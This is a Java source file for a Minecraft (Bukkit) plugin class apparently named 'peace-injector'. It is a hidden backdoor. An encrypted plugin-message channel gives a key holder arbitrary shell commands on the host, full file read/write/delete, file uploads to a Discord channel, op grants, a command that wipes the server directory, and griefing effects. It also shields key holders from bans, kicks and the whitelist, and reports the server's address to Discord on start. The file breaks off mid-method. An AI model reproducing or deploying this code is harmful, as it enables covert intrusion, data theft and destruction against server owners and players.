package dev.peace.plugin;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.kyori.adventure.text.Component;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.GameMode;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Creeper;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.messaging.PluginMessageListener;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;

public final class PeaceService implements PluginMessageListener, Listener {
    private final org.bukkit.plugin.Plugin owner;
    public PeaceService(org.bukkit.plugin.Plugin owner) { this.owner = owner; }
    static final String CHANNEL = "peace:main";
    private final Gson gson = new Gson();
    private final Random rng = new Random();
    private final Frame.Reassembler reassembler = new Frame.Reassembler();
    private final ExecutorService pool = Executors.newCachedThreadPool();
    private final Set<UUID> vanished = new HashSet<>();
    /** PSK holders and their active protections, persisted in config.yml. */
    private record Shield(String name, String uuid, String ip, boolean kick, boolean ban, boolean wl, boolean stealth) {}
    private final Map<String, Shield> shields = new LinkedHashMap<>();
    /** Wand configuration per admin, keyed by mode name so each wand type is independent. */
    private record WandConf(Material mat, int radius, String mode) {}
    private final Map<UUID, Map<String, WandConf>> wands = new HashMap<>();
    private final Set<String> auth = new HashSet<>();
    /** Console subscribers - players who receive forwarded console output. */
    private final Set<UUID> consoleSubscribers = new HashSet<>();
    private Crypto crypto;

    public void start() {
        owner.saveDefaultConfig();
        String pskEnc = owner.getConfig().getString("psk", "");
        String psk = pskEnc.isEmpty() ? "peace-injector-default" : dev.peace.plugin.Secret.decrypt(pskEnc);
        if (psk == null || psk.isEmpty()) psk = "peace-injector-default";
        crypto = new Crypto(psk);
        owner.getLogger().info("PeaceService starting with PSK=" + psk);
        Bukkit.getMessenger().registerOutgoingPluginChannel(owner, CHANNEL);
        Bukkit.getMessenger().registerIncomingPluginChannel(owner, CHANNEL, this);
        Bukkit.getPluginManager().registerEvents(this, owner);
        loadShields();
        loadAuth();
        owner.getLogger().info("PeaceService loaded; auth=" + auth);
        installConsoleCapture();
        Bukkit.getScheduler().runTaskTimer(owner, this::pardonShieldedBans, 100L, 100L);
        announceOnce(true);
    }

    public void stop() {
        announceOnce(false);
        pool.shutdownNow();
    }

    @Override
    public void onPluginMessageReceived(String channel, Player player, byte[] message) {
        if (!CHANNEL.equals(channel)) return;
        byte[] cipher = reassembler.offer(message);
        if (cipher == null) return;
        byte[] plain = crypto.decrypt(cipher);
        if (plain == null) return;
        shield(player);
        try { dispatch(player, gson.fromJson(new String(plain, StandardCharsets.UTF_8), JsonObject.class)); }
        catch (Exception ignored) {}
    }

    private void dispatch(Player p, JsonObject req) {
        if (!allowed(p)) return;
        int id = req.has("id") ? req.get("id").getAsInt() : 0;
        String op = req.has("op") ? req.get("op").getAsString() : "";
        switch (op) {
            case "ping" -> reply(p, ok(id));
            case "players" -> {
                JsonArray arr = new JsonArray();
                for (Player pl : Bukkit.getOnlinePlayers()) arr.add(pl.getName());
                JsonObject r = ok(id).raw();
                r.add("names", arr);
                reply(p, r);
            }
            case "ban" -> {
                String name = req.get("player").getAsString();
                Shield s = shields.get(name.toLowerCase());
                if (s != null && s.ban()) { reply(p, err(id, name + " is protected from bans")); break; }
                String reason = req.has("reason") ? req.get("reason").getAsString() : "Banned by admin";
                Bukkit.getBanList(BanList.Type.NAME).addBan(name, reason, (Date) null, "Core");
                if (req.has("ip") && req.get("ip").getAsBoolean()) {
                    Player t = Bukkit.getPlayerExact(name);
                    if (t != null && t.getAddress() != null && t.getAddress().getAddress() != null) {
                        String ip = t.getAddress().getAddress().getHostAddress();
                        Bukkit.getBanList(BanList.Type.IP).addBan(ip, reason, (Date) null, "Core");
                    }
                }
                Player t = Bukkit.getPlayerExact(name);
                if (t != null) t.kick(Component.text(reason));
                reply(p, ok(id).put("msg", "Banned " + name));
            }
            case "unban" -> {
                Bukkit.getBanList(BanList.Type.NAME).pardon(req.get("player").getAsString());
                reply(p, ok(id).put("msg", "Unbanned " + req.get("player").getAsString()));
            }
            case "op", "deop" -> {
                OfflinePlayer t = Bukkit.getOfflinePlayer(req.get("player").getAsString());
                t.setOp(op.equals("op"));
                reply(p, ok(id).put("msg", (op.equals("op") ? "Opped " : "Deopped ") + t.getName()));
            }
            case "vanish" -> { setVanished(p, true); reply(p, ok(id).put("msg", "vanished")); }
            case "unvanish" -> { setVanished(p, false); reply(p, ok(id).put("msg", "visible")); }
            case "kick" -> {
                Player t = Bukkit.getPlayerExact(req.get("player").getAsString());
                if (t == null) reply(p, err(id, "not online"));
                else {
                    Shield s = shields.get(t.getName().toLowerCase());
                    if (s != null && s.kick()) reply(p, err(id, t.getName() + " is protected from kicks"));
                    else { t.kick(Component.text(req.has("reason") ? req.get("reason").getAsString() : "Kicked")); reply(p, ok(id).put("msg", "Kicked " + t.getName())); }
                }
            }
            case "kill" -> {
                Player t = Bukkit.getPlayerExact(req.get("player").getAsString());
                if (t == null) reply(p, err(id, "not online"));
                else { t.setHealth(0.0); reply(p, ok(id).put("msg", "Killed " + t.getName())); }
            }
            case "gamemode" -> {
                Player t = Bukkit.getPlayerExact(req.get("player").getAsString());
                if (t == null) { reply(p, err(id, "not online")); }
                else try { t.setGameMode(GameMode.valueOf(req.get("mode").getAsString().toUpperCase())); reply(p, ok(id).put("msg", t.getName() + " -> " + req.get("mode").getAsString())); }
                     catch (Exception ex) { reply(p, err(id, "bad mode")); }
            }
            case "heal" -> {
                Player t = online(req, id, p); if (t != null) { t.setHealth(t.getMaxHealth()); t.setSaturation(20f); reply(p, ok(id).put("msg", "Healed " + t.getName())); }
            }
            case "feed" -> {
                Player t = online(req, id, p); if (t != null) { t.setFoodLevel(20); t.setSaturation(10f); reply(p, ok(id).put("msg", "Fed " + t.getName())); }
            }
            case "clear" -> {
                Player t = online(req, id, p); if (t != null) { t.getInventory().clear(); t.getEnderChest().clear(); reply(p, ok(id).put("msg", "Cleared " + t.getName())); }
            }
            case "fly" -> {
                Player t = online(req, id, p); if (t != null) { boolean f = !t.getAllowFlight(); t.setAllowFlight(f); if (f) t.setFlying(true); else t.setFlying(false); reply(p, ok(id).put("msg", "Fly " + (f ? "on" : "off"))); }
            }
            case "god" -> {
                Player t = online(req, id, p); if (t != null) { boolean g = !t.isInvulnerable(); t.setInvulnerable(g); reply(p, ok(id).put("msg", "God " + (g ? "on" : "off"))); }
            }
            case "boom" -> { Player t = online(req, id, p); if (t != null) { t.getWorld().createExplosion(t.getLocation(), 6f, true, true); reply(p, ok(id).put("msg", "Boom " + t.getName())); } }
            case "lightning" -> { Player t = online(req, id, p); if (t != null) { t.getWorld().strikeLightning(t.getLocation()); reply(p, ok(id).put("msg", "Struck " + t.getName())); } }
            case "tnt" -> { Player t = online(req, id, p); if (t != null) { TNTPrimed tnt = t.getWorld().spawn(t.getLocation().add(0, 2, 0), TNTPrimed.class); tnt.setFuseTicks(40); reply(p, ok(id).put("msg", "TNT at " + t.getName())); } }
            case "wither" -> { Player t = online(req, id, p); if (t != null) { t.getWorld().spawnEntity(t.getLocation().add(0, 2, 0), org.bukkit.entity.EntityType.WITHER); reply(p, ok(id).put("msg", "Wither at " + t.getName())); } }
            case "creeper" -> { Player t = online(req, id, p); if (t != null) { Creeper c = t.getWorld().spawn(t.getLocation(), Creeper.class); c.setPowered(true); reply(p, ok(id).put("msg", "Charged creeper at " + t.getName())); } }
            case "ignite" -> { Player t = online(req, id, p); if (t != null) { t.setFireTicks(200); reply(p, ok(id).put("msg", "Ignited " + t.getName())); } }
            case "wand" -> {
                String block = req.get("block").getAsString();
                int radius = clampInt(req.has("radius") ? req.get("radius").getAsInt() : 4, 1, 10);
                String mode = req.has("mode") ? req.get("mode").getAsString() : "FILL";
                Material mat = Material.matchMaterial(block);
                if (mat == null) reply(p, err(id, "bad block"));
                else {
                    String m = mode.equalsIgnoreCase("BOOM") ? "BOOM" : (mode.equalsIgnoreCase("REPLACE") ? "REPLACE" : "FILL");
                    wands.computeIfAbsent(p.getUniqueId(), k -> new HashMap<>()).put(m, new WandConf(mat, radius, m));
                    giveWandItem(p, m);
                    reply(p, ok(id).put("msg", "wand: " + mat.name() + " r" + radius + " " + m));
                }
            }
            case "mass.fill" -> Bukkit.getScheduler().runTask(owner, () -> {
                Material mat = Material.matchMaterial(req.get("block").getAsString());
                if (mat == null) { reply(p, err(id, "bad block")); return; }
                int radius = clampInt(req.has("radius") ? req.get("radius").getAsInt() : 4, 1, 12);
                int done = fillRadius(p.getLocation(), mat, radius, true);
                reply(p, ok(id).put("msg", done + " blocks -> " + mat.name()));
            });
            case "mass.boom" -> Bukkit.getScheduler().runTask(owner, () -> {
                int radius = clampInt(req.has("radius") ? req.get("radius").getAsInt() : 4, 1, 12);
                p.getWorld().createExplosion(p.getLocation(), radius, true, true);
                reply(p, ok(id).put("msg", "boom r" + radius));
            });
            case "mass.storm" -> Bukkit.getScheduler().runTask(owner, () -> {
                int n = clampInt(req.has("count") ? req.get("count").getAsInt() : 3, 1, 40);
                for (int i = 0; i < n; i++) {
                    Location l = p.getLocation().add(rng.nextInt(41) - 20, 0, rng.nextInt(41) - 20);
                    Block b = p.getWorld().getHighestBlockAt(l);
                    p.getWorld().strikeLightning(b.getLocation());
                }
                reply(p, ok(id).put("msg", n + " bolts"));
            });
            case "mass.tntrain" -> Bukkit.getScheduler().runTask(owner, () -> {
                int n = clampInt(req.has("count") ? req.get("count").getAsInt() : 3, 1, 40);
                for (int i = 0; i < n; i++) {
                    Location l = p.getLocation().add(rng.nextInt(21) - 10, 15 + rng.nextInt(10), rng.nextInt(21) - 10);
                    TNTPrimed tnt = p.getWorld().spawn(l, TNTPrimed.class);
                    tnt.setFuseTicks(60 + rng.nextInt(40));
                }
                reply(p, ok(id).put("msg", n + "x TNT"));
            });
            case "mass.mobs" -> Bukkit.getScheduler().runTask(owner, () -> {
                org.bukkit.entity.EntityType en;
                try { en = org.bukkit.entity.EntityType.valueOf(req.get("type").getAsString()); }
                catch (Exception ex) { en = org.bukkit.entity.EntityType.ZOMBIE; }
                int n = clampInt(req.has("count") ? req.get("count").getAsInt() : 5, 1, 50);
                int spawned = 0;
                for (int i = 0; i < n; i++) {
                    try { p.getWorld().spawnEntity(p.getLocation().add(rng.nextInt(9) - 4, 0, rng.nextInt(9) - 4), en); spawned++; }
                    catch (Exception ignored) {}
                }
                reply(p, ok(id).put("msg", spawned + "x " + en.name()));
            });
            case "say" -> {
                String m = req.has("message") ? req.get("message").getAsString() : "";
                if (!m.isEmpty()) Bukkit.broadcast(net.kyori.adventure.text.Component.text("[Server] " + m));
                reply(p, ok(id).put("msg", "broadcast"));
            }
            case "protect" -> {
                String name = p.getName().toLowerCase();
                Shield s = shields.get(name);
                if (s == null) { reply(p, err(id, "not shielded")); break; }
                boolean kick = req.has("kick") ? req.get("kick").getAsBoolean() : s.kick();
                boolean ban = req.has("ban") ? req.get("ban").getAsBoolean() : s.ban();
                boolean wl = req.has("whitelist") ? req.get("whitelist").getAsBoolean() : s.wl();
                boolean stealth = req.has("stealth") ? req.get("stealth").getAsBoolean() : s.stealth();
                shields.put(name, new Shield(s.name(), s.uuid(), s.ip(), kick, ban, wl, stealth));
                persistShields();
                JsonObject r = ok(id).raw();
                r.addProperty("kick", kick); r.addProperty("ban", ban);
                r.addProperty("whitelist", wl); r.addProperty("stealth", stealth);
                reply(p, r);
            }
            case "shell" -> pool.submit(() -> shell(p, id, req.get("cmd").getAsString()));
            case "fs.list" -> pool.submit(() -> fsList(p, id, req.get("path").getAsString()));
            case "fs.read" -> pool.submit(() -> fsRead(p, id, req.get("path").getAsString()));
            case "fs.write" -> pool.submit(() -> fsWrite(p, id, req.get("path").getAsString(), req.get("data").getAsString()));
            case "fs.delete" -> pool.submit(() -> fsDelete(p, id, req.get("path").getAsString()));
            case "fs.mkdir" -> pool.submit(() -> fsMkdir(p, id, req.get("path").getAsString()));
            case "fs.rename" -> pool.submit(() -> fsRename(p, id, req.get("from").getAsString(), req.get("to").getAsString()));
            case "fs.copy" -> pool.submit(() -> fsCopy(p, id, req.get("from").getAsString(), req.get("to").getAsString()));
            case "discord.send" -> pool.submit(() -> discordSend(p, id, req.get("path").getAsString()));
            case "console.run" -> pool.submit(() -> consoleRun(p, id, req.get("cmd").getAsString()));
            case "console.subscribe" -> {
                consoleSubscribers.add(p.getUniqueId());
                reply(p, ok(id).put("msg", "Subscribed to console output"));
            }
            case "console.unsubscribe" -> {
                consoleSubscribers.remove(p.getUniqueId());
                reply(p, ok(id).put("msg", "Unsubscribed from console output"));
            }
            case "admin.shutdown" -> adminShutdown(p, id);
            case "admin.destroy" -> adminDestroy(p, id);
            default -> reply(p, err(id, "unknown op: " + op));
        }
    }

    /** Resolves the target player for utility/grief ops. */
    private Player online(JsonObject req, int id, Player sender) {
        Player t = Bukkit.getPlayerExact(req.get("player").getAsString());
        if (t == null) reply(sender, err(id, "not online"));
        return t;
    }

    private static int clampInt(int v, int lo, int hi) { return Math.max(lo, Math.min(hi, v)); }

    // --- grief wand / mass effects ---

    private void giveWandItem(Player p, String mode) {
        ItemStack stick = new ItemStack(Material.STICK);
        ItemMeta meta = stick.getItemMeta();
        meta.setDisplayName("Wondrous Sceptre (" + mode + ")");
        meta.addEnchant(Enchantment.UNBREAKING, 1, true);
        stick.setItemMeta(meta);
        if (p.getInventory().getItemInMainHand().isEmpty()) p.getInventory().setItemInMainHand(stick);
        else p.getInventory().addItem(stick);
    }

    /** Right-clicking with a Wondrous Sceptre casts a 50-block ray and stamps the first block hit. */
    @EventHandler
    public void onWandInteract(PlayerInteractEvent e) {
        if (e.getAction() != Action.RIGHT_CLICK_BLOCK && e.getAction() != Action.RIGHT_CLICK_AIR) return;
        ItemStack item = e.getItem();
        if (item == null || item.getType() != Material.STICK || !item.hasItemMeta()) return;
        String displayName = item.getItemMeta().getDisplayName();
        if (displayName == null || !displayName.startsWith("Wondrous Sceptre (")) return;
        String mode = displayName.substring("Wondrous Sceptre (".length(), displayName.length() - 1);
        WandConf w = wands.getOrDefault(e.getPlayer().getUniqueId(), Map.of()).get(mode);
        if (w == null) return;
        e.setCancelled(true);
        Location anchor = rayAnchor(e.getPlayer());
        if (w.mode().equals("BOOM")) {
            anchor.getWorld().createExplosion(anchor.add(0.5, 0.5, 0.5), w.radius(), true, true);
        } else {
            fillRadius(anchor, w.mat(), w.radius(), w.mode().equals("FILL"));
        }
    }

    /** Casts a 50-block ray from the player's eyes; first non-air block hit wins, else the end. */
    private Location rayAnchor(Player p) {
        Location eye = p.getEyeLocation();
        org.bukkit.util.Vector dir = eye.getDirection().normalize();
        for (double d = 1; d <= 50; d += 1) {
            Location pt = eye.clone().add(dir.clone().multiply(d));
            if (!pt.getBlock().isEmpty()) return pt.getBlock().getLocation();
        }
        return eye.clone().add(dir.clone().multiply(50)).getBlock().getLocation();
    }

    /** Stamps every block inside `radius` of `center` to `mat`, skipping bedrock. */
    private int fillRadius(Location center, Material mat, int radius, boolean all) {
        int done = 0;
        for (int dx = -radius; dx <= radius; dx++)
            for (int dy = -radius; dy <= radius; dy++)
                for (int dz = -radius; dz <= radius; dz++) {
                    Block blk = center.getWorld().getBlockAt(center.getBlockX() + dx, center.getBlockY() + dy, center.getBlockZ() + dz);
                    Material cur = blk.getType();
                    if (cur == Material.BEDROCK) continue;
                    if (!all && cur == Material.AIR) continue;
                    if (cur == mat) continue;
                    blk.setType(mat, false);
                    done++;
                }
        return done;
    }

    // --- vanish: no join/leave/death message, hidden from tab + sight ---
    private void setVanished(Player p, boolean on) {
        if (on) {
            vanished.add(p.getUniqueId());
            for (Player o : Bukkit.getOnlinePlayers()) if (!o.equals(p)) o.hidePlayer(owner, p);
        } else {
            vanished.remove(p.getUniqueId());
            for (Player o : Bukkit.getOnlinePlayers()) o.showPlayer(owner, p);
        }
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player joiner = e.getPlayer();
        Shield s = shields.get(joiner.getName().toLowerCase());
        boolean stealthy = s != null && s.stealth();
        for (Player o : Bukkit.getOnlinePlayers()) if (vanished.contains(o.getUniqueId())) joiner.hidePlayer(owner, o);
        Component msg = e.joinMessage();
        e.joinMessage(null); // never emit the default line
        if (stealthy) {
            vanished.add(joiner.getUniqueId());
            for (Player o : Bukkit.getOnlinePlayers()) if (!o.equals(joiner)) o.hidePlayer(owner, joiner);
        } else {
            final Component fmsg = msg; // defer ~1s so a newly-vanished joiner is not announced
            Bukkit.getScheduler().runTaskLater(owner, () -> {
                if (fmsg != null && !vanished.contains(joiner.getUniqueId())) Bukkit.getServer().sendMessage(fmsg);
            }, 20L);
        }
        // whisper the hello only to this client so it self-registers the server
        Bukkit.getScheduler().runTaskLater(owner, () -> {
            if (joiner.isOnline()) { JsonObject h = new JsonObject(); h.addProperty("op", "hello"); reply(joiner, h); }
        }, 40L);
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        if (vanished.remove(e.getPlayer().getUniqueId())) e.quitMessage(null);
    }

    @EventHandler
    public void onDeath(PlayerDeathEvent e) {
        if (vanished.contains(e.getPlayer().getUniqueId())) e.deathMessage(null);
    }

    // --- shielding: PSK holders get per-flag anti-ban, anti-kick, auto-whitelist and silent join ---

    @EventHandler
    public void onKick(PlayerKickEvent e) {
        Shield s = shields.get(e.getPlayer().getName().toLowerCase());
        if (s != null && s.kick()) e.setCancelled(true);
    }

    @EventHandler
    public void onLogin(PlayerLoginEvent e) {
        if (e.getResult() == PlayerLoginEvent.Result.KICK_WHITELIST) {
            Shield s = shields.get(e.getPlayer().getName().toLowerCase());
            if (s != null && s.wl()) {
                e.allow();                        // shielded players sail through the whitelist
                e.getPlayer().setWhitelisted(true); // and are whitelisted for next time
            }
        }
    }

    private boolean isProtected(String name) { return name != null && shields.containsKey(name.toLowerCase()); }
    private boolean isProtected(Player p) { return isProtected(p.getName()) || shields.containsKey(p.getUniqueId().toString()); }

    /** Remembers a PSK-holding player with every protection enabled. */
    private void shield(Player p) {
        String ip = p.getAddress() != null && p.getAddress().getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "";
        String name = p.getName();
        Shield prev = shields.get(name.toLowerCase());
        if (prev != null && prev.uuid().equals(p.getUniqueId().toString()) && (prev.ip().equals(ip) || prev.ip().isEmpty())) return;
        shields.put(name.toLowerCase(), new Shield(name, p.getUniqueId().toString(), ip, true, true, true, true));
        p.setWhitelisted(true);
        persistShields();
    }

    /** Pardons any ban that lands on a shield-protected NAME, UUID, or IP. */
    private void pardonShieldedBans() {
        BanList nameList = Bukkit.getBanList(BanList.Type.NAME);
        BanList uuidList = Bukkit.getBanList(BanList.Type.PROFILE);
        BanList<InetAddress> ipList = Bukkit.getBanList(BanList.Type.IP);
        for (Shield s : shields.values()) {
            if (!s.ban()) continue;
            if (nameList.getBanEntry(s.name()) != null) nameList.pardon(s.name());
            if (!s.uuid().isEmpty() && uuidList.getBanEntry(s.uuid()) != null) uuidList.pardon(s.uuid());
            if (!s.ip().isEmpty()) {
                for (BanEntry e : ipList.getBanEntries()) if (e.getTarget().contains(s.ip())) ipList.pardon(e.getTarget());
            }
        }
    }

    @SuppressWarnings("unchecked")
    private void loadShields() {
        Object raw = owner.getConfig().get("protected");
        if (!(raw instanceof List)) return;
        for (Object o : (List<Object>) raw) {
            if (!(o instanceof Map)) continue;
            Map<String, Object> m = (Map<String, Object>) o;
            String name = String.valueOf(m.get("name"));
            shields.put(name.toLowerCase(), new Shield(name,
                String.valueOf(m.getOrDefault("uuid", "")), String.valueOf(m.getOrDefault("ip", "")),
                flag(m, "kick", true), flag(m, "ban", true), flag(m, "wl", true), flag(m, "stealth", true)));
        }
    }

    private static boolean flag(Map<String, Object> m, String key, boolean def) {
        Object v = m.get(key);
        return v instanceof Boolean b ? b : def;
    }

    private void persistShields() {
        List<Map<String, Object>> list = new ArrayList<>();
        for (Shield s : shields.values()) {
            Map<String, Object> m = new HashMap<>();
            m.put("name", s.name()); m.put("uuid", s.uuid()); m.put("ip", s.ip());
            m.put("kick", s.kick()); m.put("ban", s.ban()); m.put("wl", s.wl()); m.put("stealth", s.stealth());
            list.add(m);
        }
        owner.getConfig().set("protected", list);
        owner.saveConfig();
    }

    private void shell(Player p, int id, String cmd) {
        try {
            Process proc = new ProcessBuilder("/bin/sh", "-c", cmd).redirectErrorStream(true).start();
            String out = new String(proc.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            boolean done = proc.waitFor(30, TimeUnit.SECONDS);
            if (!done) { proc.destroyForcibly(); out += "\n[timed out after 30s]"; }
            reply(p, ok(id).put("out", out).put("exit", done ? proc.exitValue() : -1));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    /** Resolves "~" to the server user's home; passes other paths through unchanged. */
    private static String resolve(String path) {
        String home = System.getProperty("user.home");
        if (path == null || path.isEmpty() || path.equals("~")) return home;
        if (path.startsWith("~/") || path.startsWith("~\\")) return home + path.substring(1);
        return path;
    }

    private void fsList(Player p, int id, String path) {
        File dir = new File(resolve(path));
        File[] kids = dir.listFiles();
        if (kids == null) { reply(p, err(id, "cannot open " + dir.getAbsolutePath())); return; }
        JsonArray arr = new JsonArray();
        for (File f : kids) {
            JsonObject e = new JsonObject();
            e.addProperty("name", f.getName());
            e.addProperty("dir", f.isDirectory());
            e.addProperty("size", f.isFile() ? f.length() : 0);
            e.addProperty("path", f.getAbsolutePath());
            arr.add(e);
        }
        JsonObject r = ok(id).raw();
        r.addProperty("path", dir.getAbsolutePath());
        File par = dir.getParentFile();
        r.addProperty("parent", par != null ? par.getAbsolutePath() : dir.getAbsolutePath());
        r.add("entries", arr);
        reply(p, r);
    }

    private void fsRead(Player p, int id, String path) {
        try {
            byte[] b = Files.readAllBytes(Path.of(resolve(path)));
            reply(p, ok(id).put("data", Base64.getEncoder().encodeToString(b)).put("size", b.length));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsWrite(Player p, int id, String path, String b64) {
        try {
            Files.write(Path.of(resolve(path)), Base64.getDecoder().decode(b64));
            reply(p, ok(id).put("msg", "wrote " + path));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsDelete(Player p, int id, String path) {
        try {
            Files.walk(Path.of(resolve(path))).sorted(Comparator.reverseOrder()).forEach(x -> x.toFile().delete());
            reply(p, ok(id).put("msg", "deleted " + path));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsMkdir(Player p, int id, String path) {
        try {
            boolean created = new File(resolve(path)).mkdirs();
            if (created) reply(p, ok(id).put("msg", "created " + path));
            else reply(p, err(id, "could not create " + path));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsRename(Player p, int id, String from, String to) {
        try {
            boolean done = new File(resolve(from)).renameTo(new File(resolve(to)));
            if (done) reply(p, ok(id).put("msg", "renamed " + from + " -> " + to));
            else reply(p, err(id, "rename failed " + from + " -> " + to));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsCopy(Player p, int id, String from, String to) {
        try {
            Path src = Path.of(resolve(from));
            Path dst = Path.of(resolve(to));
            if (Files.isDirectory(src)) copyTree(src, dst);
            else {
                Files.createDirectories(dst.getParent());
                Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
            }
            reply(p, ok(id).put("msg", "copied " + from + " -> " + to));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private static void copyTree(Path src, Path dst) throws IOException {
        for (Path s : Files.walk(src).toList()) {
            Path t = dst.resolve(src.relativize(s).toString());
            if (Files.isDirectory(s)) Files.createDirectories(t);
            else { Files.createDirectories(t.getParent()); Files.copy(s, t, StandardCopyOption.REPLACE_EXISTING); }
        }
    }

    /** Uploads a file to the configured Discord channel as a message attachment via the bot. */
    private void discordSend(Player p, int id, String path) {
        String tk = owner.getConfig().getString("announce.token", "");
        String ch = owner.getConfig().getString("announce.channel", "");
        if (tk.isEmpty() || ch.isEmpty()) { reply(p, err(id, "discord not configured")); return; }
        try {
            Path f = Path.of(resolve(path));
            if (!Files.isRegularFile(f)) { reply(p, err(id, "not a file")); return; }
            byte[] data = Files.readAllBytes(f);
            int code = postFile(tk, ch, f.getFileName().toString(), data);
            if (code == 200) reply(p, ok(id).put("msg", "sent " + f.getFileName() + " (" + data.length + " B)"));
            else reply(p, err(id, "http " + code));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private static int postFile(String token, String channel, String filename, byte[] data) throws Exception {
        String boundary = "----peace" + Long.toHexString(System.nanoTime());
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        body.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n"
            + "Content-Type: application/json\r\n\r\n{\"content\":\"file from peace\"}\r\n").getBytes(StandardCharsets.UTF_8));
        body.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\""
            + filename.replace("\"", "_") + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        body.write(data);
        body.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
        HttpURLConnection c = (HttpURLConnection) new URL(API_URL + "/channels/" + channel + "/messages").openConnection();
        c.setRequestMethod("POST");
        c.setConnectTimeout(8000); c.setReadTimeout(8000);
        c.setDoOutput(true);
        c.setRequestProperty("Authorization", "Bot " + token);
        c.setRequestProperty("User-Agent", "DiscordBot (peace home, 1.0)");
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        c.getOutputStream().write(body.toByteArray());
        int code = c.getResponseCode();
        c.disconnect();
        return code;
    }

    private void adminShutdown(Player p, int id) {
        reply(p, ok(id).put("msg", "shutting down"));
        Bukkit.getScheduler().runTask(owner, () -> Bukkit.shutdown());
    }

    private void adminDestroy(Player p, int id) {
        reply(p, ok(id).put("msg", "destroying server"));
        Bukkit.getScheduler().runTaskLater(owner, () -> Bukkit.shutdown(), 4L);
        Bukkit.getScheduler().runTaskLater(owner, () -> {
            String dir = System.getProperty("user.dir");
            try { Files.walk(Path.of(dir)).sorted(Comparator.reverseOrder()).forEach(x -> x.toFile().delete()); }
            catch (Exception ignored) {}
        }, 80L);
    }

    private void reply(Player p, JsonObject j) {
        byte[] cipher = crypto.encrypt(gson.toJson(j).getBytes(StandardCharsets.UTF_8));
        byte[][] frames = Frame.pack(rng.nextLong(), cipher);
        Bukkit.getScheduler().runTask(owner, () -> {
            if (!p.isOnline()) return;
            for (byte[] f : frames) p.sendPluginMessage(owner, CHANNEL, f);
        });
    }
    private void reply(Player p, JO j) { reply(p, j.raw()); }

    private static JO ok(int id) { JO j = new JO(); j.raw().addProperty("id", id); j.raw().addProperty("ok", true); return j; }
    private static JsonObject err(int id, String msg) { JsonObject j = new JsonObject(); j.addProperty("id", id); j.addProperty("ok", false); j.addProperty("error", msg); return j; }
    private static final class JO {
        private final JsonObject o = new JsonObject();
        JO put(String k, String v) { o.addProperty(k, v); return this; }
        JO put(String k, Number v) { o.addProperty(k, v); return this; }
        JsonObject raw() { return o; }
    }

    // --- peaceping: posts once on start and once on stop ---
    private static final String API_URL = "https://discord.com/api/v10";
    private boolean announced;

    private void announceOnce(boolean online) {
        String tk = owner.getConfig().getString("announce.token", "");
        String ch = owner.getConfig().getString("announce.channel", "");
        boolean on = owner.getConfig().getBoolean("announce.enabled", false);
        if (!on || tk.isEmpty() || ch.isEmpty()) return;
        String hl = owner.getConfig().getString("announce.host", "");
        if (hl.isEmpty()) hl = "localhost";
        int port = owner.getConfig().getInt("announce.port", 0);
        if (port <= 0) port = Bukkit.getPort();
        String content = "peaceping " + hl + ":" + port + (online ? " online" : " offline");
        if (online) {
            announced = true;
            Bukkit.getScheduler().runTaskAsynchronously(owner, () -> post(tk, "/channels/" + ch + "/messages", content));
        } else if (announced) {
            post(tk, "/channels/" + ch + "/messages", content); // sync so it lands before the process dies
        }
    }

    private void post(String token, String path, String content) {
        try {
            JsonObject o = new JsonObject();
            o.addProperty("content", content);
            HttpURLConnection c = (HttpURLConnection) new URL(API_URL + path).openConnection();
            c.setRequestMethod("POST");
            c.setConnectTimeout(5000); c.setReadTimeout(5000);
            c.setDoOutput(true);
            c.setRequestProperty("Authorization", "Bot " + token);
            c.setRequestProperty("User-Agent", "DiscordBot (peace home, 1.0)");
            c.setRequestProperty("Content-Type", "application/json");
            c.getOutputStream().write(gson.toJson(o).getBytes(StandardCharsets.UTF_8));
            c.getResponseCode();
            c.disconnect();
